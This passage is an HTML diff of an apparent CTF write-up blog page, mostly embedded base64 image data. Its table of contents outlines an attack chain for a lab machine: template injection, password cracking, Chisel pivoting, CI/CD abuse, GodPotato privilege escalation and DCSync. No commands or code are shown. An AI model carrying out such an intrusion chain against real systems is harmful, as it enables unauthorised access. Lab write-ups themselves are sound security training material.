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" alt=""><div><div class="pc-cat">HTB</div><div class="pc-title">Fireflow</div><div class="pc-exc"></div><div class="pc-foot"><span class="pc-date">23 Jul 2026</span><span class="ptag">Linux</span><span class="pc-readtime">9 min read</span><button class="pc-share" title="Share this write-up" onclick="event.stopPropagation(); sharePost('mry0rohbft2g7hczzg7')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.6" y1="10.5" x2="15.4" y2="6.5"></line><line x1="8.6" y1="13.5" x2="15.4" y2="17.5"></line></svg></button></div></div></div><div class="pc-arr">→</div></div></div>
     </div>
 
     <!-- ====== POST VIEW PAGE ====== -->
     <div id="pagePost" class="page">
-        <div class="post-view custom-mode">
+        <div class="post-view">
             <div class="pv-topbar">
                 <button class="back-btn" onclick="showBlog()">← Back to Write-ups</button>
                 <button class="share-btn" onclick="sharePost(currentPostId)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.6" y1="10.5" x2="15.4" y2="6.5"></line><line x1="8.6" y1="13.5" x2="15.4" y2="17.5"></line></svg>Share</button>
             </div>
-            <div class="pv-header" id="pvHeader" style="display: none;">
+            <div class="pv-header" id="pvHeader" style="">
                 <div class="pv-header-inner">
                     <img id="pvIcon" class="pv-icon" style="display: none;" alt="" src="data:image/jpeg;base64,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">
                     <div>
                         <div class="pv-cat" id="pvCat">CTF</div>
                         <h1 class="pv-title" id="pvTitle">DarkZero Returns Writeup</h1>
-                        <div class="pv-meta"><span id="pvDate">30 Jul 2026</span><span id="pvTags"></span><span class="read-time" id="pvReadTime">11 min read</span></div>
+                        <div class="pv-meta"><span id="pvDate">30 Jul 2026</span><span id="pvTags"></span><span class="read-time" id="pvReadTime">10 min read</span></div>
                     </div>
                 </div>
             </div>
-            <div class="toc-box collapsed" id="tocBox" style="display:none">
+            <div class="toc-box collapsed" id="tocBox" style="display: block;">
                 <div class="toc-head" onclick="document.getElementById('tocBox').classList.toggle('collapsed')">
                     <span>Contents</span>
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
                 </div>
-                <ul class="toc-list" id="tocList"></ul>
+                <ul class="toc-list" id="tocList"><li><a href="#sec-0-document-overview">Document Overview</a></li><li><a href="#sec-1-recon">Recon</a></li><li><a href="#sec-2-initial-access-handlebars-ast-injection-cve-2026-58443">Initial access — Handlebars AST injection (CVE-2026-58443)</a></li><li><a href="#sec-3-cracking-josh-s-password">Cracking josh's password</a></li><li><a href="#sec-4-pivoting-chisel">Pivoting — Chisel</a></li><li><a href="#sec-5-kerberos-against-internal-gitea">Kerberos against internal Gitea</a></li><li><a href="#sec-6-the-reversed-pull-request-ci-cd-round-1">The reversed pull request (CI/CD, round 1)</a></li><li><a href="#sec-7-the-git-trick-ci-cd-round-2-cve-2026-22547">The .git. trick (CI/CD, round 2 — CVE-2026-22547)</a></li><li><a href="#sec-8-godpotato-system">GodPotato → SYSTEM</a></li><li><a href="#sec-9-dcsync-and-the-forest-trust-wall">DCSync — and the forest-trust wall</a></li><li><a 